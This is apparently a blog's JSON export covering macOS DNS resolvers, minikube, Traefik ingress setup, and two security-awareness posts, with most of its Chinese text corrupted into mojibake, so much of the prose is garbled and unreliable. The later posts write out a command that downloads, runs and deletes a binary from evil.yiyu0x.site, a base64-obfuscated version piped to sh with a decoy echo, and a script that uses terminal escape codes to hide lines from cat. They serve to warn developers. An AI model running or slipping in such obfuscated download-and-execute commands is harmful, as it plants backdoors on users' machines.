ç’°å¢ƒ\n\né€£ä¸Šå¯¦é©—å®¤çš„ VPN å¾Œï¼Œç™¼ç¾ VPN ä¸­çš„ domain éƒ½è§£æå¤±æ•—ï¼Œä½†æ˜¯ dig å»æ˜¯æ­£å¸¸çš„ã€‚çœ‹äº†ä¸€ä¸‹ DNS è¨­å®šä¹Ÿéƒ½æ­£å¸¸ï¼Œæ–¼æ˜¯é–‹å§‹æ‰¾åŸå› ......\n\n# DNS è§£æå•é¡Œ\n\nå‡è¨­ä»Šå¤©æˆ‘è¦è§£æ website.mydomain.orgï¼ˆå…§ç¶²ï¼‰ï¼Œæˆ‘çš„ `/etc/resolve.conf` å¦‚ä¸‹\n\n```\nsearch mydomain.org\nnameserver 10.0.0.1 # å…§ç¶² DNS 1\nnameserver 10.0.0.2 # å…§ç¶² DNS 2\nnameserver 1.1.1.1\nnameserver 8.8.8.8\n```\n\næ­¤æ™‚æœ‰æ©Ÿç‡è¼ªåˆ°å¾Œé¢å…©çµ„ï¼Œé€ æˆè§£æå¤±æ•—ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦é¡å¤–è¨­å®š\n\n# è§£æ±º\n\nåˆ—å‡ºæœ¬æ©Ÿä¸Š dns è¨­å®š\n\n`scutil --dns`\n\næˆ‘å€‘éœ€è¦é‡å°ç‰¹å®šçš„ç¶²åŸŸä½¿ç”¨ç‰¹å®šçš„ DNS Server ä¾†è§£æ\n\né¦–å…ˆå»ºç«‹ç›®éŒ„ï¼Œä½ç½®å¿…é ˆæ˜¯ `/etc/resolver`\n\n`sudo mkdir /etc/resolver`\n\nè£¡é¢çš„æª”åä¾ç…§ domain å»è¨­å®šï¼Œå‡è¨­æˆ‘è¦æŒ‡å®š mydomain.org ä¸‹çš„ nameserverï¼Œæˆ‘çš„æª”åå°±æ˜¯ `mydomain.org`\n\næ¥è€…æŠŠè©² domain ç”¨åˆ°çš„ nameserver å¯«ä¸Šï¼Œæ ¼å¼èˆ‡ `/etc/resolv.conf` ä¸€æ¨£\n\n`echo 'nameserver 10.0.0.1' > /etc/resolver/mydomain.org`\n`echo 'nameserver 10.0.0.2' > /etc/resolver/mydomain.org`\n\nè¨­å®šä¹‹å¾Œå†åº¦è¨ªå• `website.mydomain.org` å°±å¯ä»¥æ­£å¸¸è§£æäº†\n\n### åƒè€ƒ\n\n- [Domain-specific DNS server on your Macbook Pro](https://medium.com/@jamieeduncan/i-recently-moved-to-a-macbook-for-my-primary-work-laptop-7c704dbaff59)\n\n","tags":["macOS","DNS"]},{"title":"èˆ‡ minikube å…±äº« local docker image","url":"/2020/08/31/","content":"\nç‚ºäº†å°‡æœå‹™è·‘åœ¨ K8s ä¸­ï¼Œå®¹å™¨åŒ–æ˜¯å¿…é ˆçš„ã€‚åœ¨ç¨‹å¼å³å°‡éƒ¨ç½²ä¹‹éš›ï¼Œæœƒéœ€è¦æ¸¬è©¦ä¸€äº› K8s ä¸­çš„ç’°å¢ƒè®Šæ•¸æ˜¯å¦å¯ä»¥è¢«ç¨‹å¼æ­£å¸¸è®€å–ï¼Œæˆ–æ˜¯ç‚ºäº†ç¬¦åˆ K8s ç’°å¢ƒï¼Œå°‡ç¨‹å¼æ‰“åŒ…æˆå®¹å™¨æ˜ åƒè©¦è‘—éƒ¨ç½²ä¸Šå¢é›†è©¦è©¦çœ‹æœ‰æ²’æœ‰å•é¡Œã€‚é€™å€‹éç¨‹çš„å·¥ä½œæµå¤§è‡´ä¸Šå¦‚ä¸‹ï¼š\n\n```\næ‰“åŒ… (docker build . -t my-app:0.1)\néƒ¨ç½² (kubectl apply -f deploy.yaml)\nç¢ºèªæ˜¯å¦æœ‰å•é¡Œï¼Œæœ‰çš„è©±ä¿®æ”¹ç¨‹å¼ï¼Œç„¶å¾Œç¹å›ç¬¬ä¸€æ­¥\n```\n\næˆ‘å€‘åœ¨ Local é–‹ç™¼æ™‚ï¼Œå¯èƒ½æœƒä½¿ç”¨ minikube ä¾†ç•¶ä½œæ¸¬è©¦ç”¨çš„éƒ¨ç½²ç’°å¢ƒï¼Œä½†æ˜¯ minikube å¯¦éš›ä¸Šæ˜¯èµ·ä¸€å€‹æ–°çš„ docker-daemonï¼Œä»–ä¸¦ä¸èªè­˜ macOS æˆ–æ˜¯ Linux ä¸Šçš„ docker-daemonã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½ åœ¨ Local å°‡ image build å®Œç•¢ï¼Œåœ¨ minikube ä¸­ä¸¦ç„¡æ³•å­˜å– Local çš„ Docker Registryã€‚é€™å°æ–¼æ­£åœ¨å¿«é€Ÿé–‹ç™¼æ¸¬è©¦çš„äººä¾†èªªæ¥µç‚ºä¸ä¾¿ï¼Œæˆ‘å€‘å¾ˆå¯èƒ½æ”¹ä¸€è¡Œ code å°±éœ€è¦é¦¬ä¸Šçœ‹æ˜¯å¦åœ¨ K8s ç’°å¢ƒèƒ½æ­£å¸¸é‹ä½œã€‚\n\nè¦è§£æ±ºé€™å€‹å•é¡Œå¤§è‡´ä¸Šæœ‰å¹¾ç¨®æ–¹æ³•ï¼š\n\n1. ä½¿ç”¨å¤–éƒ¨ Docker Hub ä¾†ç•¶ä½œ Docker Registry\n    ç¼ºé»ï¼šæš´éœ²åœ¨å¤–ç¶²ã€å¤–ç¶²æµé‡æ…¢\n2. åœ¨ Local è·‘ä¸€å€‹ Docker Registryï¼Œè®“ Local èˆ‡ minikube å…±ç”¨\n    ç¼ºé»ï¼šLocal IP å¦‚æœæ›æ‰ï¼Œyaml è¨­å®šæª”çš„ image ä½ç½®åˆè¦é‡å¯«\n3. åœ¨ minikube ç’°å¢ƒä¸­è·‘ä¸€å€‹ Docker Registryï¼Œport-forward åˆ° Local ä¸Š\n    ç¼ºé»ï¼šç¬¬ä¸€æ¬¡è¨­å®šè¼ƒç¹ç‘£ï¼Œä½†å¤§è‡´ä¸Šå·²ç¶“ç®—å¥½ç”¨\n\né€™é‚Šè¦æçš„æ–¹æ³•å€‹äººè¦ºå¾—è¼ƒæ–¹ä¾¿ï¼Œä½†åŒæ™‚ä¹Ÿæœ‰ä¸€äº›ä¸æ–¹ä¾¿çš„åœ°æ–¹\n\nè©²æ–¹æ³•åŸç†æ˜¯ç›´æ¥åœ¨ build image æ™‚ç›´æ¥å­˜é€² minikube çš„ Registry ä¸­\n\næ–¹æ³•å¦‚ä¸‹ï¼š\n\n`eval $(minikube docker-env)`\n\n`docker build -t my-app .`\n\næ­¤æ™‚å¯ä»¥ç”¨ `minikube ssh` é€²å»çœ‹ `docker images` æœƒç™¼ç¾ Image å·²ç¶“é€²åˆ° Registry ä¸­\n\næœ€å¾Œåœ¨ yaml æª”æœ‰ç”¨åˆ°è©² image çš„åœ°æ–¹åŠ ä¸Š\n\n```yaml\nimagePullPolicy: Never\n```\n\nç¢ºä¿åœ¨ pull image æ™‚åªæœƒæ‹‰ Local çš„ Image\n\nè©²æ–¹æ³•æ˜¯é€éé‡æ–°æŒ‡å®šç’°å¢ƒè®Šæ•¸ä¾†æ”¹è®Š docker æŒ‡ä»¤æ“ä½œ docker-deamon çš„ä½ç½®\n\næ‰€ä»¥é–‹ä¸€å€‹æ–°çš„ session å°±è¦é‡æ–°è¨­å®šä¸€æ¬¡ï¼Œç®—æ˜¯ä¸€å€‹å°ç¼ºé»\n","tags":["kubernetes","docker"]},{"title":"åœ¨ K8S ä¸­ä½¿ç”¨ Traefik ä½œç‚º Ingress Controllers","url":"/2020/07/11/","content":"\n## å‰è¨€\n\nK8S ä¸­çš„ Ingress Controllers ä¸¦æ²’æœ‰å¯¦ä½œï¼Œå¯ä»¥è‡ªå·±ä½¿ç”¨å„ç¨®ç‰ˆæœ¬ã€‚åœ¨ Minikube ä¸­çš„ Ingress Controllers é è¨­æ˜¯ç”¨ [NGINX Ingress Controller](https://kubernetes.github.io/ingress-nginx/)ï¼Œç„¶è€Œ NGINX Ingress Controller çš„åŠŸèƒ½éå¸¸é™½æ˜¥ï¼Œå®˜ç¶²æœ‰æä¾›ä¸€ç³»åˆ—çš„ [Ingress Controller](https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/) çµ¦å„ä½åƒè€ƒï¼Œè©²æ–‡ç« ç´€éŒ„å¦‚ä½•ä½¿ç”¨ [Traefik](https://docs.traefik.io/) é€™å€‹ Edge Router ä½œç‚º Ingress Controllerã€‚\n\n\n## æ­£æ–‡\n\nåœ¨æ“ä½œ K8S ä¹‹å‰è«‹å…ˆç¢ºå®šä½ æ­£åœ¨æ“ä½œçš„å¢é›†æ˜¯ç·´ç¿’ç’°å¢ƒï¼š\n\n`kubectl cluster-info`\n\nTraefik é€™å¥—å·¥å…·å¯ä»¥å°‡å¤–éƒ¨çš„æµé‡å¸æ”¶ï¼Œä¸¦ä¸”é€éè‡ªå·±å®šç¾©çš„è·¯ç”±ä¾†å°‡æµé‡å¾€å…§éƒ¨çš„ Service æ‰“ã€‚æˆ‘å€‘å¸Œæœ›å¯ä»¥é€é URL çš„ Path ä¾†å®šç¾©ä¸åŒæœå‹™çš„è·¯ç”±ï¼Œå°‡æµé‡æ‰“å‘ä¸åŒçš„æœå‹™ã€‚\n\nåœ¨ NGINX Ingress Controller ä¸­è¦åšé€™ä»¶äº‹æƒ…ï¼Œè¦åœ¨ `annotations` ä¸­åŠ ä¸Š `nginx.ingress.kubernetes.io/rewrite-target: /`\n\n```yaml\napiVersion: networking.k8s.io/v1beta1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\n  name: rewrite\n  namespace: default\nspec:\n...\n...\n...\n```\n\né¿å…ä¸åŒ App åƒåˆ°ä¸åŒçš„è·¯ç”±ä½ç½®ç„¡æ³•ç”¢ç”Ÿæ­£ç¢ºçš„å›æ‡‰ï¼ˆå‡è¨­æˆ‘å€‘çš„æœå‹™å…¥å£éƒ½åœ¨æ ¹è·¯å¾‘ Ex: `app-foo/` ï¼‰ã€‚\n\nä½† Traefik è¦é”æˆé€™ä»¶äº‹æƒ…å¿…é ˆé€é [Middleware](https://docs.traefik.io/middlewares/overview/) é€™å€‹çµ„ä»¶ï¼ˆTraefik å®šç¾©çš„åŠŸèƒ½ï¼‰ï¼Œç°¡å–®ä¾†èªªæˆ‘å€‘è¦æŠŠè®€é€²ä¾†çš„ /pathï¼Œstrip æ‰ä¸¦ä¸”å°‡å°å‘åˆ°æŒ‡å®šçš„ Service ä¸Šã€‚\n\n![](https://docs.traefik.io/assets/img/middleware/overview.png)\n\nè¦ä½¿ç”¨ Traefik Middleware æœ‰å…©ç¨®æ–¹å¼ï¼š\n\n- IngressRoute (CustomResourceDefinitions)\n- åœ¨ Ingress ä¸­ä½¿ç”¨ annotation å®šç¾©\n\nå€‹äººè¦ºå¾—ç¬¬äºŒé»æ¯”è¼ƒç›´è¦ºï¼Œæ‰€ä»¥é¸æ“‡ç¬¬äºŒç¨®æ–¹å¼ã€‚\n\né¦–å…ˆï¼Œå…ˆå»ºç«‹ Middleware é€™å€‹ CRDï¼Œä¸¦ä¸”åš ClusterRoleBindingï¼š\n\n```yaml\napiVersion: apiextensions.k8s.io/v1beta1\nkind: CustomResourceDefinition\nmetadata:\n  name: middlewares.traefik.containo.us\n\nspec:\n  group: traefik.containo.us\n  version: v1alpha1\n  names:\n    kind: Middleware\n    plural: middlewares\n    singular: middleware\n  scope: Namespaced\n\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: traefik-ingress-controller\n\nrules:\n  - apiGroups:\n      - \"\"\n    resources:\n      - services\n      - endpoints\n      - secrets\n    verbs:\n      - get\n      - list\n      - watch\n  - apiGroups:\n      - extensions\n    resources:\n      - ingresses\n    verbs:\n      - get\n      - list\n      - watch\n  - apiGroups:\n      - extensions\n    resources:\n      - ingresses/status\n    verbs:\n      - update\n  - apiGroups:\n      - traefik.containo.us\n    resources:\n      - middlewares\n      - ingressroutes\n      - traefikservices\n      - ingressroutetcps\n      - ingressrouteudps\n      - tlsoptions\n      - tlsstores\n    verbs:\n      - get\n      - list\n      - watch\n\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: traefik-ingress-controller\n\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: traefik-ingress-controller\nsubjects:\n  - kind: ServiceAccount\n    name: traefik-ingress-controller\n    namespace: default\n```\n\nå°‡ Traefik æœ¬èº«è·‘èµ·ä¾†ï¼š\n\n```yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  namespace: default\n  name: traefik-ingress-controller\n\n---\nkind: Deployment\napiVersion: apps/v1\nmetadata:\n  namespace: default\n  name: traefik\n  labels:\n    app: traefik\n\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: traefik\n  template:\n    metadata:\n      labels:\n        app: traefik\n    spec:\n      serviceAccountName: traefik-ingress-controller\n      containers:\n        - name: traefik\n          image: traefik:v2.2\n          args:\n            - --api.insecure\n            - --accesslog\n            - --entrypoints.web.Address=:8000\n            - --providers.kubernetesingress\n            - --providers.kubernetescrd\n          ports:\n            - name: web\n              containerPort: 8000\n            - name: admin\n              containerPort: 8080\n```\n\nç‚º Traefik è¨­å®š Serviceï¼š\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: traefik\n\nspec:\n  ports:\n    - protocol: TCP\n      name: web\n      port: 8000\n    - protocol: TCP\n      name: admin\n      port: 8080\n  selector:\n    app: traefik\n```\n\nå»ºç«‹ Ingress èˆ‡ Middleware(stripprefix)ï¼š\n\n```yaml\napiVersion: networking.k8s.io/v1beta1\nkind: Ingress\nmetadata:\n  name: yy-ingress\n  annotations:\n    traefik.ingress.kubernetes.io/router.entrypoints: web\n    traefik.ingress.kubernetes.io/router.middlewares: default-stripprefix@kubernetescrd\nspec:\n  rules:\n  - host: yy.k8s\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: whales\n          servicePort: 80\n      - path: /app\n        backend:\n          serviceName: whales\n          servicePort: 80\n      - path: /whoami\n        backend:\n          serviceName: whoami\n          servicePort: 80\n  - host: admin.yy.k8s\n    http:\n      paths:\n        - path: /\n          backend:\n            serviceName: traefik\n            servicePort: 8080\n\n---\napiVersion: traefik.containo.us/v1alpha1\nkind: Middleware\nmetadata:\n  name: stripprefix\nspec:\n  stripPrefix:\n    prefixes:\n      - /app\n      - /whoami\n```\n\nè¦æ³¨æ„çš„é‡é»æœ‰ï¼š\n- CRD ä¸­çš„æ¬Šé™è¦è¨˜å¾— middwares æœ‰è¢«åŠ é€²å»ã€‚\n- è¦ä½¿ç”¨ Ingressï¼ŒTraefik è·‘èµ·ä¾†æ™‚è¦åŠ ä¸Š `--providers.kubernetesingress`\n- å¦‚æœç”¨ IngressRoute è·‘ï¼Œè¦åŠ ä¸Š `--providers.kubernetescrd`\n- annotations ä¸­ middleware çš„åå­—æœ€å‰é¢éœ€è¦åŠ ä¸Š namespaceï¼ˆæœ¬æ–‡ä½¿ç”¨ defaultï¼‰\n- å¦‚æœç›´æ¥è²¼ Traefik å®˜ç¶²çš„ user-guides/crd-acmeï¼Œè¦æ³¨æ„å®ƒä¸¦æ²’æœ‰åŠ ä¸Š `--providers.kubernetesingress`ï¼Œæ‰€ä»¥ç„¡æ³•èˆ‡ Ingress æ­£ç¢ºç¶å®š\n- åœ¨ local æ¸¬è©¦å¯ä»¥ç”¨ `kubectl port-forward svc/traefik foo-port:8080` é€£åˆ° dashboard ä¾† debug\n\næ›´å¤šè©³ç´°è¨­å®šå¯ä»¥åƒè€ƒ [user-guides/crd-acme](https://docs.traefik.io/user-guides/crd-acme/#ingressroute-definition)ï¼Œä»¥ä¸Šçš„è¨­å®šæ¯”è¼ƒç²¾ç°¡ï¼Œæ­¤æ–‡ç« åªæœ‰ç•™å¿…è¦éƒ¨åˆ†è€Œå·²ã€‚\n\nå®Œæ•´çš„è¨­å®šå¯ä»¥åˆ° [GitHub Repo](https://github.com/yiyu0x/k8s-traefik-example) ä¸Šé¢çœ‹ã€‚","tags":["kubernetes"]},{"title":"çœ¼è¦‹ç‚ºæ†‘ï¼Ÿåˆ©ç”¨çµ‚ç«¯æ©Ÿç‰¹æ€§è—åŒ¿æƒ¡æ„æŒ‡ä»¤","url":"/2020/04/29/","content":"\n## å‰è¨€\n\nå°æ–¼ Linux ä½¿ç”¨è€…æˆ–æ˜¯è»Ÿé«”å·¥ç¨‹å¸«ä¾†èªªï¼Œçµ‚ç«¯æ©Ÿæ˜¯æ¯å¤©å¿…é ˆç”¨åˆ°çš„è»Ÿé«”ä¹‹ä¸€ã€‚å°¤å…¶æ˜¯é‚£äº›æ³¨é‡é–‹ç™¼æ•ˆç‡ä»¥åŠæœ‰åœ¨ç¶­è­·ä¼ºæœå™¨çš„å·¥ç¨‹å¸«ä¾†èªªï¼Œæˆ‘å€‘éƒ½ä¸å¸Œæœ›é›™æ‰‹é›¢é–‹éµç›¤ï¼Œåˆ†æ•£æ³¨æ„åŠ›ã€‚é€™ç¨®æƒ…æ³ä¸‹ï¼Œç•¶æˆ‘å€‘è¦ç¨å¾®æª¢è¦–æª”æ¡ˆå…§å®¹æ™‚ï¼Œæœƒä½¿ç”¨åˆ°ä»¥ä¸‹å¹¾å€‹å¸¸ç”¨çš„å·¥å…·ï¼š\n\n- cat\n- less\n- more\n- vim\n\nç„¶è€Œæˆ‘å€‘é€éå·¥å…·æ‰€çœ‹åˆ°çš„æª”æ¡ˆå…§å®¹ï¼Œå¯ä»¥å®Œå…¨ç›¸ä¿¡å—ï¼Ÿ\n\n## çœ¼è¦‹ç‚ºæ†‘ï¼Ÿ\n\n### cat\n\n{% asciinema 325079 %}\n\nçœ‹éä¸Šè¿°ä¾‹å­ä¹‹å¾Œï¼Œä½ é‚„æ•¢åªç”¨ `cat` ç¢ºèªæª”æ¡ˆå…§å®¹å—ï¼Ÿ\n\nç‚ºä½•æœƒç™¼ç”Ÿé€™ç¨®äº‹ï¼ŸåŸå› åœ¨æ–¼çµ‚ç«¯æ©Ÿæœ¬èº«å°±æœƒè¾¨èªå¹¾å€‹å…·æœ‰æ„ç¾©çš„ç‰¹æ®Šå­—å…ƒï¼Œä½ å¯èƒ½ç”¨éä¸€äº›ç‰¹åˆ¥çš„å·¥å…·å¯ä»¥è®“çµ‚ç«¯æ©Ÿå°å‡ºæœ‰é¡è‰²çš„å­—ï¼Œå°±æ˜¯åˆ©ç”¨åˆ°é€™ç¨®ç‰¹æ€§ã€‚\n\né‚£é€™äº›ç‰¹æ®Šå­—å…ƒå¯ä»¥æ“ä½œçµ‚ç«¯æ©Ÿçš„å“ªäº›è¡Œç‚ºå‘¢ï¼Ÿ\n\n- ç§»å‹•æ¸¸æ¨™åˆ°ä»»æ„ä½ç½®\n- åˆªé™¤ä»»æ„å°å‡ºçš„å­—å…ƒ\n- æ“ä½œçµ‚ç«¯æ©Ÿè¦–çª—\n- å°‡ä¸åŒæŒ‰éµå°æ‡‰åˆ°çš„çµ‚ç«¯æ©Ÿè¡Œç‚ºé€²è¡Œè¦†å¯«\n\nä¸Šè¿°ç¯„ä¾‹ï¼Œå°±æ˜¯é€éç§»å‹•çµ‚ç«¯æ©Ÿæ¸¸æ¨™ï¼Œè®“å…©è¡ŒæŒ‡ä»¤éƒ½å°åœ¨åŒä¸€å€‹ä½ç½®ä¸Šï¼ˆä½ç½®é‡ç–Šï¼Œåªæœƒé¡¯ç¤ºè¦†è“‹çš„æŒ‡ä»¤ï¼‰ï¼Œå¦‚æ­¤ä¸€ä¾†å°±å¯ä»¥éš±è—è¢«è¦†è“‹çš„æŒ‡ä»¤ã€‚\n\n### curl\n\næˆ‘å€‘æ› `curl -s` è©¦è©¦\n\n{% asciinema 325095 %}\n\nçœ‹å®Œé€™å€‹ä¾‹å­ä¹‹å¾Œï¼Œæˆ‘ç›¸ä¿¡ä½ å†ä¹Ÿä¸æ•¢ç›¸ä¿¡è‚‰çœ¼çœ‹åˆ°çš„å…§å®¹ã€‚\n\n### çµè«–\n\nå¦‚æœè¦ç¢ºèªæª”æ¡ˆçš„å…§å®¹æƒ³è¦ç”¨ `cat` çš„è©±ï¼Œå¯ä»¥åŠ ä¸Šåƒæ•¸ `v`ï¼Œé¡¯ç¤ºä¸å¯è¦–å­—å…ƒã€‚\n\nä»¥ç¬¬ä¸€å€‹ä¾‹å­ä¾†èªªï¼š`cat -v script.sh`\n\n```bash\n#!/bin/sh\n\necho \"evil!\"\nexit 0\n^[[2Aecho \"Hello World!\"\n```\n\n`^[[2A` å°±æ˜¯å‘Šè¨´çµ‚ç«¯æ©Ÿå°‡æ¸¸æ¨™å¾€ä¸Šç§»å‹•å…©è¡Œï¼Œç¹¼çºŒå¾è©²ä½ç½®å°å‡ºï¼ˆè¦†è“‹åŸæœ¬çš„ echo \"evil!\"ï¼‰ã€‚\n\nå¯ä»¥çš„è©±ï¼Œé‚„æ˜¯å»ºè­°ä½¿ç”¨æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹ç¢ºèªå…§å®¹æœƒæ¯”èµ·ç›´æ¥å°å‡ºå…§å®¹åœ¨çµ‚ç«¯æ©Ÿä¾†å¾—å¯ä¿¡ã€‚\n\nå¦‚æœæƒ³è¦è‡ªå·±æ¸¬è©¦çš„è©±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤\n\n```bash\necho -e '#!/bin/sh\\n\\necho \"evil!\"\\nexit 0\\n\\033[2Aecho \"Hello World!\"\\n' > script.sh\nchmod a+x script.sh\n```\n\næˆ–æ˜¯ä½ æƒ³æ·±å…¥äº†è§£çµ‚ç«¯æ©Ÿæ§åˆ¶å­—å…ƒä»¥åŠä¸åŒçµ‚ç«¯æ©Ÿçš„ç‹€æ³å¯ä»¥åƒè€ƒ [Terminal Escape Injection](https://www.infosecmatter.com/terminal-escape-injection/#what-are-the-escape-sequences)ã€‚\n","tags":["è³‡è¨Šå®‰å…¨"]},{"title":"å¾é§­å®¢è§’åº¦å‘Šè¨´ä½ ç‚ºä½•ä¸è¦éš¨æ„è¤‡è£½æŒ‡ä»¤","url":"/2020/03/16/","content":"\nç›¸ä¿¡å¾ˆå¤šäººéƒ½æœ‰é€™æ¨£çš„ç¶“é©—ï¼Œä¸‹æŒ‡ä»¤æ™‚ç”¢ç”ŸæŸæŸéŒ¯èª¤ã€‚é€™å€‹éŒ¯èª¤å¯èƒ½æ²’è¦‹éï¼Œä¹Ÿå¯èƒ½æ˜¯ä¹‹å‰é‡éä½†æ˜¯å¿˜è¨˜æ€éº¼è§£ã€‚ä½†æˆ‘å€‘åªè¦å°‡éŒ¯èª¤è¤‡è£½èµ·ä¾†ï¼Œè²¼ä¸Šæœå°‹å¼•æ“ï¼Œé¦¬ä¸Šå°±æœƒè·³å‡ºå„ç¨®ç¶²é å¯ä»¥åƒè€ƒï¼Œç„¡å€«æ˜¯çŸ¥åçš„ç¨‹å¼è¨è«–è«–å£‡ï¼Œæˆ–è‘—æ˜¯å®˜æ–¹æ–‡ä»¶ï¼Œåˆæˆ–è‘—æ˜¯å€‹äººè‡ªè¡Œæ¶è¨­çš„éƒ¨è½æ ¼ã€‚çœ‹åˆ°æŒ‡ä»¤å°±è²¼ä¸Šé€™å€‹ç¿’æ…£ï¼Œæ˜¯é–‹ç™¼è€…çš„çœ¾å¤šå£ç¿’æ…£ä¹‹ä¸€ã€‚\n\né§­å®¢å¯ä»¥å¾ˆå·§å¦™çš„åˆ©ç”¨é€™ä¸€é»ï¼Œå°‡ç²¾å¿ƒè£½ä½œçš„å¾Œé–€ç¨‹å¼ï¼ˆæˆ–å…¶ä»–æƒ¡æ„ç¨‹å¼ï¼‰ï¼Œé€éåŒ…è£ï¼Œèª˜é¨™å—å®³è€…ï¼ˆå¯èƒ½å°±æ˜¯ä½ ï¼‰å»åŸ·è¡Œã€‚\n\n## ç”Ÿç”¢æƒ¡æ„æŒ‡ä»¤\n\nå‡å¦‚ä»Šå¤©æˆ‘æƒ³è¦è®“å—å®³è€…çš„é›»è…¦åŸ·è¡Œä¸€æ¢æŒ‡ä»¤å°±è¢«æ¤å…¥å¾Œé–€ï¼Œæˆ‘æœƒé€™éº¼åšï¼š\n\n`curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil`\n\né¦–å…ˆå…ˆé€é `curl` ä¸‹è¼‰é ç«¯ç·¨è­¯å¥½çš„æƒ¡æ„ç¨‹å¼ï¼Œä¸¦ä¸”çµ¦äºˆè©²ç¨‹å¼åŸ·è¡Œæ¬Šé™ï¼Œç„¶å¾ŒåŸ·è¡Œï¼Œæœ€å¾Œåˆªé™¤ï¼ˆåŒ¿è¹¤ï¼‰ã€‚\n\nä½†é€™ç¨®æŒ‡ä»¤æˆ‘æƒ³æ‡‰è©²æ²’æœ‰äººæœƒç›´æ¥è²¼ä¸ŠåŸ·è¡Œï¼Œä¸ä½†æ„åœ–æ˜é¡¯ï¼Œè€Œä¸”é‚„ç›´æ¥å‘Šè¨´å—å®³è€…ï¼šã€Œæˆ‘æ‰“ç®—ä¸‹è¼‰ä¾†è·¯ä¸åçš„æª”æ¡ˆï¼Œè€Œä¸”è¦åŸ·è¡Œå®ƒã€ã€‚\n\n## å½è£\n\næƒ³è¦å½è£é€šå¸¸æˆ‘å€‘æœƒå°‡æŒ‡ä»¤åŒ…è£¹æˆå…¶ä»–æ„åœ–ï¼Œé€éç°¡å–®çš„ç·¨ç¢¼ä¾†å°‡é€™å€‹æƒ¡æ„æŒ‡ä»¤é€²è¡Œç·¨ç¢¼ï¼Œä»¥ä¸‹é¸ç”¨ base64 é€²è¡Œç·¨ç¢¼ï¼š\n\n```\nY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\n```\n\nç‚ºä½•é¸æ“‡ä½¿ç”¨ `base64`ï¼ŒåŸå› æ˜¯å› ç‚º Linux å…§å»ºå°±æœ‰ base64 å·¥å…·ï¼Œå—å®³äººå¯ä»¥é€éåŸ·è¡Œ base64 è§£ç¢¼å·¥å…·ï¼Œè§£å‡ºå…·æœ‰æ„ç¾©çš„å­—ä¸²\n\n```bash\necho \"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d\n```\n\noutput:\n```\ncurl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil\n```\n\næ¥è‘—å°‡å­—ä¸² pipe åˆ° `sh` å°±å¯ä»¥ç›´æ¥é‹è¡Œï¼š\n\n```bash\necho \"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\nä»¥ä¸ŠæŒ‡ä»¤å°±æ²’æœ‰è¾¦æ³•ä¸€çœ¼å°±çœ‹å‡ºç›®çš„ï¼Œä½†æ„åœ–ä¸è®Šã€‚\n\n## é€²ä¸€æ­¥å½è£\n\næœ‰ç¶“é©—çš„é–‹ç™¼è€…çœ‹åˆ°æŒ‡ä»¤ä¸­å¸¶æœ‰ `sh` å°±æœƒé¦¬ä¸Šèµ·ç–‘å¿ƒï¼Œé€™æ˜¯ä¸€ä»¶å¥½äº‹ã€‚å› ç‚ºæœ¬ä¾†å°±ä¸æ‡‰è©²éš¨ä¾¿ä¸‹å…·æœ‰åŸ·è¡Œæ¬Šé™çš„æŒ‡ä»¤ï¼Œä½•æ³ä½ æ ¹æœ¬ä¸çŸ¥é“é‚£ä¸² `base64` å­—ä¸²è§£å‡ºä¾†ç‚ºä½•ã€‚\n\næˆ‘å€‘å¯ä»¥å…ˆå°‡æˆ‘å€‘çš„æƒ¡æ„æŒ‡ä»¤å¤šæ–°å¢ä¸€å€‹åŠŸèƒ½ï¼Œå°å‡ºä¸€äº›å­—ä¸²ï¼Œè®“å—å®³è€…ä»¥ç‚ºé€™ä¸² `base64` å°±æ˜¯ä¸€å€‹æ™®é€šçš„å­—ä¸²è€Œå·²ï¼š\n\n`echo \"Hi, Im yiyu0x :)\" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil`\n\né€²è¡Œç·¨ç¢¼ï¼š\n\n```\nZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\n```\n\næƒ¡æ„æŒ‡ä»¤ï¼š\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\nåŸ·è¡Œå¾Œçš„çµæœï¼š\n\n`Hi, Im yiyu0x 